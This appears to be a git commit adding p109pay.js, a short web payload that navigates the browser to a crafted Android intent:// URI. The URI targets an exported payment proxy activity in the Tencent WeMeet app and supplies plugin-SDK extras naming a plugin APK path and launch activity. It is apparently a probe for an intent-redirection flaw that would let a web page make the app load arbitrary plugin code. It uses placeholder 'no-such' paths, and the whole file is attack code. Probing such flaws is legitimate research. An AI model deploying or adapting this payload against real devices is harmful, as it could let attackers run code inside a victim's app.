6f5163a4c69791b99a69c97e02efcebdc29e8607
whs <401056294@qq.com>
2026-09-05 23:26:53 -0400

    add p109 ToolBox custom scheme pivot probe

---
+++ p109pay.js
@@ -0,0 +1,5 @@
+(function(){
+  var uri='intent://p109/#Intent;scheme=wmp109;component=com.tencent.wemeet.app/com.tencent.midas.proxyactivity.APMidasPayProxyActivity;S.pluginsdk_pluginName=P109;S.pluginsdk_launchActivity=p109.NoSuchActivity;S.pluginsdk_pluginpath=/data/user/0/com.tencent.wemeet.app/files/p109-no-such.apk;B.pluginsdk_isNewProcess=true;B.pluginsdk_logEnable=true;end';
+  document.title='P109PAY-READY';
+  setTimeout(function(){document.title='P109PAY-NAV';window.location.href=uri},900);
+})();
